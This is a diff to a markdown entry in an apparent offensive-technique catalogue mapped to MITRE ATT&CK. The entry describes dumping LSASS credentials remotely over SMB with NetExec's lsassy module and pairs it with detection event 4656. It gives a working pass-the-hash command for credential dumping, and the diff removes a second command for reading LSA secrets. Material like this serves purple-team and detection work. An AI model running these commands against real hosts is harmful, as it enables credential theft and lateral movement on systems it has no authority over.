@@ -1,22 +1,22 @@
 ---
 id: lsass-dump-lsassy
-title: Remote LSASS / LSA secrets (NetExec)
+title: Remote LSASS dump (NetExec lsassy)
 section: Lateral movement & remote execution
 phase: Credential Access
 attack:
   tactic: TA0006
-  techniques: [T1003.001, T1003.004]
+  techniques: [T1003.001]
 platform: [windows, network]
 source: hacktheplanet §"Lateral movement & remote execution"
 pair: lsass-4656
 ---
 
-With local-admin on a box, pull credentials from memory without dropping a tool:
-the `lsassy` module dumps LSASS over SMB and parses creds in memory, and `--lsa`
-reads the LSA secrets (service account passwords, cached domain creds, DPAPI
-keys). Opening a handle to lsass is the noisy part — see the paired `4656`.
+With local-admin on a box, pull credentials from LSASS memory over SMB without
+dropping a tool to disk — the `lsassy` module dumps the process and parses creds
+in memory. Opening a handle to lsass is the unavoidable, noisy part: that's the
+paired `4656`. (LSA secrets via `--lsa` are a *different* technique with different
+telemetry — a candidate for its own pair, not this one.)
 
 ```sh
 nxc smb {{rhost}} -u {{user}} -H {{nthash}} -M lsassy
-nxc smb {{rhost}} -u {{user}} -p {{password}} --lsa
 ```
